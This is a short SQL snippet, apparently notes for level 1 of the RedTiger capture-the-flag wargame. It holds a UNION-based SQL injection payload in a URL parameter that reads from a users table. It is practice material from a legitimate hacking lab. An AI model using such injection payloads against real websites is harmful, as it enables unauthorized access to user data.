SELECT * FROM tb_name
WHERE cat='1'
UNION SELECT * FROM level1_users;

-- https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,3,4 FROM level1_users;